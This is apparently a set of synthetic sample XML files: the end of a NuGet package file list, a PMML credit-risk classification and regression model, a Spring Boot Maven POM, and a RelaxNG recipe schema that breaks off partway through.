    <file src="bin\Release\net8.0\SampleLibrary.DataAccess.pdb" target="lib\net8.0\SampleLibrary.DataAccess.pdb" />
    <file src="bin\Release\net8.0\SampleLibrary.DataAccess.xml" target="lib\net8.0\SampleLibrary.DataAccess.xml" />
    
    <!-- Reference assemblies for compile-time -->
    <file src="bin\Release\net6.0\ref\SampleLibrary.DataAccess.dll" target="ref\net6.0\SampleLibrary.DataAccess.dll" />
    <file src="bin\Release\net8.0\ref\SampleLibrary.DataAccess.dll" target="ref\net8.0\SampleLibrary.DataAccess.dll" />
    
    <!-- Runtime assemblies for specific runtimes -->
    <file src="bin\Release\net6.0\win-x64\SampleLibrary.DataAccess.dll" target="runtimes\win-x64\lib\net6.0\SampleLibrary.DataAccess.dll" />
    <file src="bin\Release\net6.0\linux-x64\SampleLibrary.DataAccess.dll" target="runtimes\linux-x64\lib\net6.0\SampleLibrary.DataAccess.dll" />
    <file src="bin\Release\net6.0\osx-x64\SampleLibrary.DataAccess.dll" target="runtimes\osx-x64\lib\net6.0\SampleLibrary.DataAccess.dll" />
    
    <!-- Native libraries for different platforms -->
    <file src="native\win-x64\SampleLibrary.Native.dll" target="runtimes\win-x64\native\SampleLibrary.Native.dll" />
    <file src="native\linux-x64\libSampleLibrary.Native.so" target="runtimes\linux-x64\native\libSampleLibrary.Native.so" />
    <file src="native\osx-x64\libSampleLibrary.Native.dylib" target="runtimes\osx-x64\native\libSampleLibrary.Native.dylib" />
    
    <!-- Build tools and targets -->
    <file src="build\SampleLibrary.DataAccess.props" target="build\SampleLibrary.DataAccess.props" />
    <file src="build\SampleLibrary.DataAccess.targets" target="build\SampleLibrary.DataAccess.targets" />
    <file src="buildMultiTargeting\SampleLibrary.DataAccess.props" target="buildMultiTargeting\SampleLibrary.DataAccess.props" />
    <file src="buildMultiTargeting\SampleLibrary.DataAccess.targets" target="buildMultiTargeting\SampleLibrary.DataAccess.targets" />
    
    <!-- Analyzers for different languages -->
    <file src="analyzers\dotnet\cs\SampleLibrary.DataAccess.Analyzers.dll" target="analyzers\dotnet\cs\SampleLibrary.DataAccess.Analyzers.dll" />
    <file src="analyzers\dotnet\vb\SampleLibrary.DataAccess.Analyzers.dll" target="analyzers\dotnet\vb\SampleLibrary.DataAccess.Analyzers.dll" />
    
    <!-- Content files for transformations -->
    <file src="content\app.config.transform" target="content\app.config.transform" />
    <file src="content\web.config.transform" target="content\web.config.transform" />
    <file src="content\appsettings.json.pp" target="content\appsettings.json.pp" />
    
    <!-- Content files with build actions -->
    <file src="contentFiles\cs\any\DataAccess\IRepository.cs" target="contentFiles\cs\any\DataAccess\IRepository.cs" />
    <file src="contentFiles\cs\any\DataAccess\BaseRepository.cs" target="contentFiles\cs\any\DataAccess\BaseRepository.cs" />
    <file src="contentFiles\any\any\DatabaseScripts\InitialSetup.sql" target="contentFiles\any\any\DatabaseScripts\InitialSetup.sql" />
    
    <!-- Tools and PowerShell scripts -->
    <file src="tools\install.ps1" target="tools\install.ps1" />
    <file src="tools\uninstall.ps1" target="tools\uninstall.ps1" />
    <file src="tools\init.ps1" target="tools\init.ps1" />
    <file src="tools\SampleLibrary.DataAccess.psm1" target="tools\SampleLibrary.DataAccess.psm1" />
    
    <!-- Documentation and samples -->
    <file src="README.md" target="README.md" />
    <file src="LICENSE" target="LICENSE" />
    <file src="CHANGELOG.md" target="CHANGELOG.md" />
    <file src="docs\**\*" target="docs" />
    <file src="samples\**\*" target="samples" />
    <file src="icon.png" target="icon.png" />
    
    <!-- Source code for source packages -->
    <file src="src\**\*.cs" target="src" exclude="**\bin\**;**\obj\**" />
    <file src="src\**\*.csproj" target="src" />
    <file src="src\**\*.props" target="src" />
    <file src="src\**\*.targets" target="src" />
    
    <!-- Symbol packages -->
    <file src="bin\Release\net6.0\SampleLibrary.DataAccess.pdb" target="lib\net6.0\SampleLibrary.DataAccess.pdb" />
    <file src="bin\Release\net8.0\SampleLibrary.DataAccess.pdb" target="lib\net8.0\SampleLibrary.DataAccess.pdb" />
    <file src="src\**\*.cs" target="src" exclude="**\bin\**;**\obj\**;**\tests\**" />
  </files>
</package>
</file>

<file path="sample_data/test_files_synthetic/small/pmml/credit-risk-model.xml">
<?xml version="1.0" encoding="UTF-8"?>
<PMML version="4.4" 
      xmlns="http://www.dmg.org/PMML-4_4" 
      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:schemaLocation="http://www.dmg.org/PMML-4_4 http://www.dmg.org/pmml/v4-4/pmml-4-4.xsd">

  <Header copyright="Example Analytics Corp" description="Customer Credit Risk Assessment Model">
    <Extension name="user" value="data.scientist@example.com" extender="Example Analytics"/>
    <Application name="CreditRisk Analytics Platform" version="2.1.3"/>
    <Annotation>
      This PMML model predicts credit risk for loan applications based on customer
      demographics, financial history, and behavioral patterns. The model uses a
      gradient boosting ensemble approach for high accuracy prediction.
    </Annotation>
    <Timestamp>2025-07-23T10:30:00</Timestamp>
  </Header>

  <!-- Data Dictionary -->
  <DataDictionary numberOfFields="12">
    
    <DataField name="age" optype="continuous" dataType="double">
      <Interval closure="closedClosed" leftMargin="18" rightMargin="90"/>
    </DataField>
    
    <DataField name="income" optype="continuous" dataType="double">
      <Interval closure="closedClosed" leftMargin="0" rightMargin="500000"/>
    </DataField>
    
    <DataField name="debt_to_income_ratio" optype="continuous" dataType="double">
      <Interval closure="closedClosed" leftMargin="0" rightMargin="1"/>
    </DataField>
    
    <DataField name="credit_score" optype="continuous" dataType="integer">
      <Interval closure="closedClosed" leftMargin="300" rightMargin="850"/>
    </DataField>
    
    <DataField name="employment_length" optype="continuous" dataType="double">
      <Interval closure="closedClosed" leftMargin="0" rightMargin="40"/>
    </DataField>
    
    <DataField name="home_ownership" optype="categorical" dataType="string">
      <Value value="RENT"/>
      <Value value="OWN"/>
      <Value value="MORTGAGE"/>
      <Value value="OTHER"/>
    </DataField>
    
    <DataField name="loan_purpose" optype="categorical" dataType="string">
      <Value value="debt_consolidation"/>
      <Value value="credit_card"/>
      <Value value="home_improvement"/>
      <Value value="major_purchase"/>
      <Value value="medical"/>
      <Value value="car"/>
      <Value value="vacation"/>
      <Value value="moving"/>
      <Value value="wedding"/>
      <Value value="other"/>
    </DataField>
    
    <DataField name="loan_amount" optype="continuous" dataType="double">
      <Interval closure="closedClosed" leftMargin="1000" rightMargin="40000"/>
    </DataField>
    
    <DataField name="loan_term" optype="ordinal" dataType="integer">
      <Value value="36"/>
      <Value value="60"/>
    </DataField>
    
    <DataField name="number_of_credit_lines" optype="continuous" dataType="integer">
      <Interval closure="closedClosed" leftMargin="0" rightMargin="50"/>
    </DataField>
    
    <DataField name="recent_credit_inquiries" optype="continuous" dataType="integer">
      <Interval closure="closedClosed" leftMargin="0" rightMargin="20"/>
    </DataField>
    
    <DataField name="credit_risk" optype="categorical" dataType="string">
      <Value value="LOW"/>
      <Value value="MEDIUM"/>
      <Value value="HIGH"/>
    </DataField>
    
  </DataDictionary>

  <!-- Tree Model -->
  <TreeModel modelName="CreditRiskDecisionTree" 
             functionName="classification" 
             algorithmName="C4.5" 
             splitCharacteristic="binarySplit">
    
    <MiningSchema>
      <MiningField name="age" usageType="active"/>
      <MiningField name="income" usageType="active"/>
      <MiningField name="debt_to_income_ratio" usageType="active"/>
      <MiningField name="credit_score" usageType="active"/>
      <MiningField name="employment_length" usageType="active"/>
      <MiningField name="home_ownership" usageType="active"/>
      <MiningField name="loan_purpose" usageType="active"/>
      <MiningField name="loan_amount" usageType="active"/>
      <MiningField name="loan_term" usageType="active"/>
      <MiningField name="number_of_credit_lines" usageType="active"/>
      <MiningField name="recent_credit_inquiries" usageType="active"/>
      <MiningField name="credit_risk" usageType="predicted"/>
    </MiningSchema>

    <Output>
      <OutputField name="predicted_credit_risk" 
                   optype="categorical" 
                   dataType="string" 
                   feature="predictedValue"/>
      <OutputField name="probability_LOW" 
                   optype="continuous" 
                   dataType="double" 
                   feature="probability" 
                   value="LOW"/>
      <OutputField name="probability_MEDIUM" 
                   optype="continuous" 
                   dataType="double" 
                   feature="probability" 
                   value="MEDIUM"/>
      <OutputField name="probability_HIGH" 
                   optype="continuous" 
                   dataType="double" 
                   feature="probability" 
                   value="HIGH"/>
    </Output>

    <LocalTransformations>
      <DerivedField name="log_income" optype="continuous" dataType="double">
        <Apply function="ln">
          <FieldRef field="income"/>
        </Apply>
      </DerivedField>
      
      <DerivedField name="credit_utilization" optype="continuous" dataType="double">
        <Apply function="/">
          <FieldRef field="loan_amount"/>
          <FieldRef field="income"/>
        </Apply>
      </DerivedField>
    </LocalTransformations>

    <!-- Decision Tree Structure -->
    <Node id="1" score="MEDIUM" recordCount="10000">
      <True/>
      <ScoreDistribution value="LOW" recordCount="3500" confidence="0.35"/>
      <ScoreDistribution value="MEDIUM" recordCount="4200" confidence="0.42"/>
      <ScoreDistribution value="HIGH" recordCount="2300" confidence="0.23"/>
      
      <!-- First Split: Credit Score -->
      <Node id="2" score="HIGH" recordCount="3200">
        <SimplePredicate field="credit_score" operator="lessThan" value="650"/>
        <ScoreDistribution value="LOW" recordCount="200" confidence="0.0625"/>
        <ScoreDistribution value="MEDIUM" recordCount="1200" confidence="0.375"/>
        <ScoreDistribution value="HIGH" recordCount="1800" confidence="0.5625"/>
        
        <!-- High Risk Branch - Debt to Income Ratio -->
        <Node id="3" score="HIGH" recordCount="1800">
          <SimplePredicate field="debt_to_income_ratio" operator="greaterThan" value="0.4"/>
          <ScoreDistribution value="LOW" recordCount="50" confidence="0.028"/>
          <ScoreDistribution value="MEDIUM" recordCount="350" confidence="0.194"/>
          <ScoreDistribution value="HIGH" recordCount="1400" confidence="0.778"/>
          
          <Node id="4" score="HIGH" recordCount="1200">
            <SimplePredicate field="recent_credit_inquiries" operator="greaterThan" value="3"/>
            <ScoreDistribution value="LOW" recordCount="20" confidence="0.017"/>
            <ScoreDistribution value="MEDIUM" recordCount="180" confidence="0.15"/>
            <ScoreDistribution value="HIGH" recordCount="1000" confidence="0.833"/>
          </Node>
          
          <Node id="5" score="MEDIUM" recordCount="600">
            <SimplePredicate field="recent_credit_inquiries" operator="lessOrEqual" value="3"/>
            <ScoreDistribution value="LOW" recordCount="30" confidence="0.05"/>
            <ScoreDistribution value="MEDIUM" recordCount="170" confidence="0.283"/>
            <ScoreDistribution value="HIGH" recordCount="400" confidence="0.667"/>
          </Node>
        </Node>
        
        <!-- Medium Risk Branch -->
        <Node id="6" score="MEDIUM" recordCount="1400">
          <SimplePredicate field="debt_to_income_ratio" operator="lessOrEqual" value="0.4"/>
          <ScoreDistribution value="LOW" recordCount="150" confidence="0.107"/>
          <ScoreDistribution value="MEDIUM" recordCount="850" confidence="0.607"/>
          <ScoreDistribution value="HIGH" recordCount="400" confidence="0.286"/>
          
          <Node id="7" score="MEDIUM" recordCount="900">
            <SimplePredicate field="employment_length" operator="greaterThan" value="2"/>
            <ScoreDistribution value="LOW" recordCount="120" confidence="0.133"/>
            <ScoreDistribution value="MEDIUM" recordCount="580" confidence="0.644"/>
            <ScoreDistribution value="HIGH" recordCount="200" confidence="0.222"/>
          </Node>
          
          <Node id="8" score="HIGH" recordCount="500">
            <SimplePredicate field="employment_length" operator="lessOrEqual" value="2"/>
            <ScoreDistribution value="LOW" recordCount="30" confidence="0.06"/>
            <ScoreDistribution value="MEDIUM" recordCount="270" confidence="0.54"/>
            <ScoreDistribution value="HIGH" recordCount="200" confidence="0.4"/>
          </Node>
        </Node>
      </Node>
      
      <!-- Good Credit Score Branch -->
      <Node id="9" score="LOW" recordCount="6800">
        <SimplePredicate field="credit_score" operator="greaterOrEqual" value="650"/>
        <ScoreDistribution value="LOW" recordCount="3300" confidence="0.485"/>
        <ScoreDistribution value="MEDIUM" recordCount="3000" confidence="0.441"/>
        <ScoreDistribution value="HIGH" recordCount="500" confidence="0.074"/>
        
        <!-- Income-based splits -->
        <Node id="10" score="LOW" recordCount="4200">
          <SimplePredicate field="income" operator="greaterThan" value="50000"/>
          <ScoreDistribution value="LOW" recordCount="2600" confidence="0.619"/>
          <ScoreDistribution value="MEDIUM" recordCount="1400" confidence="0.333"/>
          <ScoreDistribution value="HIGH" recordCount="200" confidence="0.048"/>
          
          <Node id="11" score="LOW" recordCount="2800">
            <SimplePredicate field="debt_to_income_ratio" operator="lessThan" value="0.3"/>
            <ScoreDistribution value="LOW" recordCount="2100" confidence="0.75"/>
            <ScoreDistribution value="MEDIUM" recordCount="600" confidence="0.214"/>
            <ScoreDistribution value="HIGH" recordCount="100" confidence="0.036"/>
          </Node>
          
          <Node id="12" score="MEDIUM" recordCount="1400">
            <SimplePredicate field="debt_to_income_ratio" operator="greaterOrEqual" value="0.3"/>
            <ScoreDistribution value="LOW" recordCount="500" confidence="0.357"/>
            <ScoreDistribution value="MEDIUM" recordCount="800" confidence="0.571"/>
            <ScoreDistribution value="HIGH" recordCount="100" confidence="0.071"/>
          </Node>
        </Node>
        
        <Node id="13" score="MEDIUM" recordCount="2600">
          <SimplePredicate field="income" operator="lessOrEqual" value="50000"/>
          <ScoreDistribution value="LOW" recordCount="700" confidence="0.269"/>
          <ScoreDistribution value="MEDIUM" recordCount="1600" confidence="0.615"/>
          <ScoreDistribution value="HIGH" recordCount="300" confidence="0.115"/>
          
          <!-- Home ownership influence -->
          <Node id="14" score="MEDIUM" recordCount="1800">
            <CompoundPredicate booleanOperator="or">
              <SimplePredicate field="home_ownership" operator="equal" value="OWN"/>
              <SimplePredicate field="home_ownership" operator="equal" value="MORTGAGE"/>
            </CompoundPredicate>
            <ScoreDistribution value="LOW" recordCount="600" confidence="0.333"/>
            <ScoreDistribution value="MEDIUM" recordCount="1000" confidence="0.556"/>
            <ScoreDistribution value="HIGH" recordCount="200" confidence="0.111"/>
          </Node>
          
          <Node id="15" score="MEDIUM" recordCount="800">
            <SimplePredicate field="home_ownership" operator="equal" value="RENT"/>
            <ScoreDistribution value="LOW" recordCount="100" confidence="0.125"/>
            <ScoreDistribution value="MEDIUM" recordCount="600" confidence="0.75"/>
            <ScoreDistribution value="HIGH" recordCount="100" confidence="0.125"/>
          </Node>
        </Node>
      </Node>
    </Node>
  </TreeModel>

  <!-- Regression Model for Risk Score -->
  <RegressionModel modelName="CreditRiskScore" 
                   functionName="regression" 
                   algorithmName="linearRegression" 
                   targetFieldName="risk_score">
    
    <MiningSchema>
      <MiningField name="age" usageType="active"/>
      <MiningField name="income" usageType="active"/>
      <MiningField name="debt_to_income_ratio" usageType="active"/>
      <MiningField name="credit_score" usageType="active"/>
      <MiningField name="employment_length" usageType="active"/>
      <MiningField name="loan_amount" usageType="active"/>
      <MiningField name="number_of_credit_lines" usageType="active"/>
      <MiningField name="recent_credit_inquiries" usageType="active"/>
      <MiningField name="risk_score" usageType="predicted"/>
    </MiningSchema>

    <Output>
      <OutputField name="predicted_risk_score" 
                   optype="continuous" 
                   dataType="double" 
                   feature="predictedValue"/>
    </Output>

    <RegressionTable intercept="85.5">
      <NumericPredictor name="age" exponent="1" coefficient="-0.15"/>
      <NumericPredictor name="income" exponent="1" coefficient="-0.00008"/>
      <NumericPredictor name="debt_to_income_ratio" exponent="1" coefficient="45.2"/>
      <NumericPredictor name="credit_score" exponent="1" coefficient="-0.12"/>
      <NumericPredictor name="employment_length" exponent="1" coefficient="-0.8"/>
      <NumericPredictor name="loan_amount" exponent="1" coefficient="0.0003"/>
      <NumericPredictor name="number_of_credit_lines" exponent="1" coefficient="0.5"/>
      <NumericPredictor name="recent_credit_inquiries" exponent="1" coefficient="2.1"/>
    </RegressionTable>
  </RegressionModel>

  <!-- Model Verification -->
  <ModelVerification recordCount="1000" fieldCount="12">
    <VerificationFields>
      <VerificationField field="age" column="col1"/>
      <VerificationField field="income" column="col2"/>
      <VerificationField field="debt_to_income_ratio" column="col3"/>
      <VerificationField field="credit_score" column="col4"/>
      <VerificationField field="employment_length" column="col5"/>
      <VerificationField field="home_ownership" column="col6"/>
      <VerificationField field="loan_purpose" column="col7"/>
      <VerificationField field="loan_amount" column="col8"/>
      <VerificationField field="loan_term" column="col9"/>
      <VerificationField field="number_of_credit_lines" column="col10"/>
      <VerificationField field="recent_credit_inquiries" column="col11"/>
      <VerificationField field="predicted_credit_risk" column="col12"/>
    </VerificationFields>
    
    <InlineTable>
      <row>
        <col1>35</col1>
        <col2>65000</col2>
        <col3>0.25</col3>
        <col4>720</col4>
        <col5>5</col5>
        <col6>OWN</col6>
        <col7>debt_consolidation</col7>
        <col8>15000</col8>
        <col9>36</col9>
        <col10>8</col10>
        <col11>1</col11>
        <col12>LOW</col12>
      </row>
      <row>
        <col1>28</col1>
        <col2>45000</col2>
        <col3>0.45</col3>
        <col4>580</col4>
        <col5>2</col5>
        <col6>RENT</col6>
        <col7>credit_card</col7>
        <col8>8000</col8>
        <col9>36</col9>
        <col10>12</col10>
        <col11>5</col11>
        <col12>HIGH</col12>
      </row>
      <row>
        <col1>42</col1>
        <col2>85000</col2>
        <col3>0.35</col3>
        <col4>680</col4>
        <col5>8</col5>
        <col6>MORTGAGE</col6>
        <col7>home_improvement</col7>
        <col8>25000</col8>
        <col9>60</col9>
        <col10>6</col10>
        <col11>2</col11>
        <col12>MEDIUM</col12>
      </row>
    </InlineTable>
  </ModelVerification>

  <!-- Model Statistics -->
  <ModelStats>
    <UnivariateStats field="age">
      <Counts totalFreq="10000" missingFreq="0" invalidFreq="0"/>
      <NumericInfo minimum="18" maximum="85" mean="38.5" standardDeviation="12.8"/>
      <Quantile quantileLimit="0.25" quantileValue="29"/>
      <Quantile quantileLimit="0.5" quantileValue="37"/>
      <Quantile quantileLimit="0.75" quantileValue="47"/>
    </UnivariateStats>
    
    <UnivariateStats field="income">
      <Counts totalFreq="10000" missingFreq="0" invalidFreq="0"/>
      <NumericInfo minimum="15000" maximum="250000" mean="62500" standardDeviation="28750"/>
    </UnivariateStats>
    
    <UnivariateStats field="credit_score">
      <Counts totalFreq="10000" missingFreq="0" invalidFreq="0"/>
      <NumericInfo minimum="350" maximum="825" mean="670" standardDeviation="85"/>
    </UnivariateStats>
  </ModelStats>

  <!-- Model Explanation -->
  <ModelExplanation>
    <PredictiveModelQuality targetField="credit_risk" dataName="validation" dataUsage="test">
      <ConfusionMatrix>
        <ClassLabels>
          <Array n="3" type="string">LOW MEDIUM HIGH</Array>
        </ClassLabels>
        <Matrix>
          <Array n="3" type="int">820 45 15</Array>
          <Array n="3" type="int">35 750 65</Array>
          <Array n="3" type="int">10 55 205</Array>
        </Matrix>
      </ConfusionMatrix>
      <LiftData targetFieldValue="HIGH" targetFieldDisplayValue="High Risk">
        <ModelLiftGraph>
          <LiftGraph>
            <XCoordinates>
              <Array n="11" type="real">0.0 0.1 0.2 0.3 0.4 0.5 0.6 0.7 0.8 0.9 1.0</Array>
            </XCoordinates>
            <YCoordinates>
              <Array n="11" type="real">0.0 0.35 0.58 0.72 0.81 0.87 0.91 0.94 0.96 0.98 1.0</Array>
            </YCoordinates>
          </LiftGraph>
        </ModelLiftGraph>
      </LiftData>
    </PredictiveModelQuality>
  </ModelExplanation>

</PMML>
</file>

<file path="sample_data/test_files_synthetic/small/pom/spring-boot-example-pom.xml">
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>3.0.4</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>

    <groupId>com.in28minutes.springboot.rest.example</groupId>
    <artifactId>spring-boot-2-jpa-with-hibernate-and-h2</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <packaging>jar</packaging>

    <name>spring-boot-2-jpa-with-hibernate-and-h2</name>
    <description>Spring Boot 2, Hibernate, JPA and H2 - Example Project</description>

    <properties>
        <java.version>17</java.version>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-data-jpa</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-devtools</artifactId>
            <scope>runtime</scope>
        </dependency>
        <dependency>
            <groupId>com.h2database</groupId>
            <artifactId>h2</artifactId>
            <scope>runtime</scope>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>

</project>
</file>

<file path="sample_data/test_files_synthetic/small/relaxng/recipe-collection.rng">
<?xml version="1.0" encoding="UTF-8"?>
<grammar xmlns="http://relaxng.org/ns/structure/1.0"
         xmlns:a="http://relaxng.org/ns/compatibility/annotations/1.0"
         datatypeLibrary="http://www.w3.org/2001/XMLSchema-datatypes">

  <a:documentation>
    RelaxNG Schema for Recipe Collection XML Format
    
    This schema defines the structure for a recipe collection document
    including recipes, ingredients, instructions, nutritional information,
    and metadata.
    
    Version: 1.0
    Author: Recipe Schema Working Group
    Last Updated: July 23, 2025
  </a:documentation>

  <!-- Root element -->
  <start>
    <element name="recipeCollection">
      <a:documentation>Root element containing a collection of recipes</a:documentation>
      <ref name="recipeCollectionContent"/>
    </element>
  </start>

  <!-- Recipe Collection Content -->
  <define name="recipeCollectionContent">
    <attribute name="version">
      <value>1.0</value>
    </attribute>
    <optional>
      <attribute name="xmlns">
        <value>http://www.example.com/recipes/1.0</value>
      </attribute>
    </optional>
    
    <!-- Metadata -->
    <element name="metadata">
      <ref name="metadataContent"/>
    </element>
    
    <!-- Recipe categories (optional) -->
    <optional>
      <element name="categories">
        <oneOrMore>
          <element name="category">
            <attribute name="id">
              <data type="ID"/>
            </attribute>
            <attribute name="name">
              <data type="string"/>
            </attribute>
            <optional>
              <attribute name="description">
                <data type="string"/>
              </attribute>
            </optional>
            <text/>
          </element>
        </oneOrMore>
      </element>
    </optional>
    
    <!-- Recipes -->
    <element name="recipes">
      <oneOrMore>
        <element name="recipe">
          <ref name="recipeContent"/>
        </element>
      </oneOrMore>
    </element>
  </define>

  <!-- Metadata Content -->
  <define name="metadataContent">
    <element name="title">
      <text/>
    </element>
    
    <optional>
      <element name="description">
        <text/>
      </element>
    </optional>
    
    <element name="author">
      <ref name="personContent"/>
    </element>
    
    <optional>
      <element name="contributors">
        <oneOrMore>
          <element name="contributor">
            <ref name="personContent"/>
          </element>
        </oneOrMore>
      </element>
    </optional>
    
    <element name="created">
      <data type="date"/>
    </element>
    
    <optional>
      <element name="lastModified">
        <data type="dateTime"/>
      </element>
    </optional>
    
    <optional>
      <element name="language">
        <data type="language"/>
      </element>
    </optional>
    
    <optional>
      <element name="tags">
        <oneOrMore>
          <element name="tag">
            <text/>
          </element>
        </oneOrMore>
      </element>
    </optional>
  </define>

  <!-- Person Content -->
  <define name="personContent">
    <element name="name">
      <text/>
    </element>
    
    <optional>
      <element name="email">
        <data type="string">
          <param name="pattern">[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}</param>
        </data>
      </element>
    </optional>
    
    <optional>
      <element name="website">
        <data type="anyURI"/>
      </element>
    </optional>
    
    <optional>
      <element name="bio">
        <text/>
      </element>
    </optional>
  </define>

  <!-- Recipe Content -->
  <define name="recipeContent">
    <attribute name="id">
      <data type="ID"/>
    </attribute>
    
    <optional>
      <attribute name="categoryRef">
        <data type="IDREF"/>
      </attribute>
    </optional>
    
    <!-- Basic recipe information -->
    <element name="title">
      <text/>
    </element>
    
    <optional>
      <element name="subtitle">
        <text/>
      </element>
    </optional>
    
    <element name="description">
      <text/>
    </element>
    
    <optional>
      <element name="cuisine">
        <choice>
          <value>italian</value>
          <value>french</value>
          <value>asian</value>
          <value>mexican</value>
          <value>indian</value>
          <value>mediterranean</value>
          <value>american</value>
          <value>other</value>
        </choice>
      </element>
    </optional>
    
    <element name="difficulty">
      <choice>
        <value>easy</value>
        <value>medium</value>
        <value>hard</value>
        <value>expert</value>
      </choice>
    </element>
    
    <!-- Timing information -->
    <element name="timing">
      <optional>
        <element name="prepTime">
          <data type="duration"/>
        </element>
      </optional>
      
      <optional>
        <element name="cookTime">
          <data type="duration"/>
        </element>
      </optional>
      
      <element name="totalTime">
        <data type="duration"/>
      </element>
      
      <optional>
        <element name="chillTime">
          <data type="duration"/>
        </element>
      </optional>
      
      <optional>
        <element name="marinateTime">
          <data type="duration"/>
        </element>
      </optional>
    </element>
    
    <!-- Serving information -->
    <element name="servings">
      <attribute name="min">
        <data type="positiveInteger"/>
      </attribute>
      
      <optional>
        <attribute name="max">
          <data type="positiveInteger"/>
        </attribute>
      </optional>
      
      <optional>
        <attribute name="unit">
          <choice>
            <value>servings</value>
            <value>portions</value>
            <value>pieces</value>
            <value>slices</value>
          </choice>
        </attribute>
      </optional>
      
      <text/>
    </element>
    
    <!-- Ingredients -->
    <element name="ingredients">
      <oneOrMore>
        <choice>
          <element name="ingredient">
            <ref name="ingredientContent"/>
          </element>
          <element name="ingredientGroup">
            <attribute name="name">
              <text/>
            </attribute>
            <oneOrMore>
              <element name="ingredient">
                <ref name="ingredientContent"/>
              </element>
            </oneOrMore>
          </element>
        </choice>
      </oneOrMore>
    </element>
    
    <!-- Equipment (optional) -->
    <optional>
      <element name="equipment">
        <oneOrMore>
          <element name="item">
            <attribute name="name">
              <text/>
            </attribute>
            <optional>
              <attribute name="essential">
                <data type="boolean"/>
              </attribute>
            </optional>
            <optional>
              <text/>
            </optional>
          </element>
        </oneOrMore>
      </element>
    </optional>
    
    <!-- Instructions -->
    <element name="instructions">
      <oneOrMore>
        <choice>
          <element name="step">
            <ref name="stepContent"/>
          </element>
          <element name="stepGroup">
            <attribute name="name">
              <text/>
            </attribute>
            <oneOrMore>
              <element name="step">
                <ref name="stepContent"/>
              </element>
            </oneOrMore>
          </element>
        </choice>
      </oneOrMore>
    </element>
    
    <!-- Nutritional information (optional) -->
    <optional>
      <element name="nutrition">
        <ref name="nutritionContent"/>
      </element>
    </optional>
    
    <!-- Notes and tips (optional) -->
    <optional>
      <element name="notes">
        <oneOrMore>
          <element name="note">
            <optional>
              <attribute name="type">
                <choice>
                  <value>tip</value>
                  <value>warning</value>
                  <value>substitution</value>
                  <value>storage</value>
                  <value>variation</value>
                </choice>
              </attribute>
            </optional>
            <text/>
          </element>
        </oneOrMore>
      </element>
    </optional>
    
    <!-- Recipe metadata -->
    <optional>
      <element name="recipeMetadata">
        <optional>
          <element name="created">
            <data type="date"/>
          </element>
        </optional>
        
        <optional>
          <element name="lastModified">
            <data type="dateTime"/>
          </element>
        </optional>
        
        <optional>
          <element name="rating">
            <data type="decimal">
              <param name="minInclusive">0</param>
              <param name="maxInclusive">5</param>
            </data>
          </element>
        </optional>
        
        <optional>
          <element name="reviews">
            <data type="nonNegativeInteger"/>
          </element>
        </optional>
        
        <optional>
          <element name="source">
            <optional>
              <attribute name="type">
                <choice>
                  <value>original</value>
                  <value>adapted</value>
                  <value>inspired</value>
                </choice>
              </attribute>
            </optional>
            <text/>
          </element>
        </optional>
      </element>
    </optional>
  </define>

  <!-- Ingredient Content -->
  <define name="ingredientContent">
    <optional>
      <attribute name="id">
        <data type="ID"/>
      </attribute>
    </optional>
    
    <optional>
      <attribute name="optional">
        <data type="boolean"/>
      </attribute>
    </optional>
    
    <element name="quantity">
      <optional>
        <attribute name="min">
          <data type="decimal"/>
        </attribute>
      </optional>
      
      <optional>
        <attribute name="max">
          <data type="decimal"/>
        </attribute>
      </optional>
      
      <data type="string"/>
    </element>
    
    <optional>
      <element name="unit">
        <choice>
          <!-- Volume units -->
          <value>cup</value>
          <value>cups</value>
          <value>tablespoon</value>
          <value>tablespoons</value>
          <value>teaspoon</value>
          <value>teaspoons</value>
          <value>liter</value>
          <value>liters</value>
          <value>milliliter</value>
          <value>milliliters</value>
          <value>fluid ounce</value>
          <value>fluid ounces</value>
          <!-- Weight units -->
          <value>pound</value>
          <value>pounds</value>
          <value>ounce</value>
          <value>ounces</value>
          <value>gram</value>
          <value>grams</value>
          <value>kilogram</value>
          <value>kilograms</value>
          <!-- Count units -->
          <value>piece</value>
          <value>pieces</value>
          <value>slice</value>
          <value>slices</value>
          <value>clove</value>
          <value>cloves</value>
          <!-- Other -->
          <value>pinch</value>
          <value>dash</value>
          <value>to taste</value>
        </choice>
      </element>
    </optional>
    
    <element name="name">
      <text/>
    </element>
    
    <optional>
      <element name="preparation">
        <text/>
      </element>
    </optional>
    
    <optional>
      <element name="substitutions">
        <oneOrMore>
          <element name="substitution">
            <text/>
          </element>
        </oneOrMore>
      </element>
    </optional>
  </define>

  <!-- Step Content -->
  <define name="stepContent">
    <attribute name="number">
      <data type="positiveInteger"/>
    </attribute>
    
    <optional>
      <attribute name="time">
        <data type="duration"/>
      </attribute>
    </optional>
    
    <optional>
      <attribute name="temperature">
        <data type="string"/>
      </attribute>
    </optional>
    
    <interleave>
      <element name="description">
        <text/>
      </element>
      
      <optional>
        <element name="tip">
          <text/>
        </element>
      </optional>
      
      <optional>
        <element name="warning">
          <text/>
        </element>
      </optional>
    </interleave>
  </define>

  <!-- Nutrition Content -->
  <define name="nutritionContent">
    <optional>
      <attribute name="per">
        <choice>
          <value>serving</value>
          <value>100g</value>
          <value>recipe</value>
        </choice>
      </attribute>
    </optional>
    
    <optional>
      <element name="calories">
        <data type="nonNegativeInteger"/>
      </element>
    </optional>
    
    <optional>
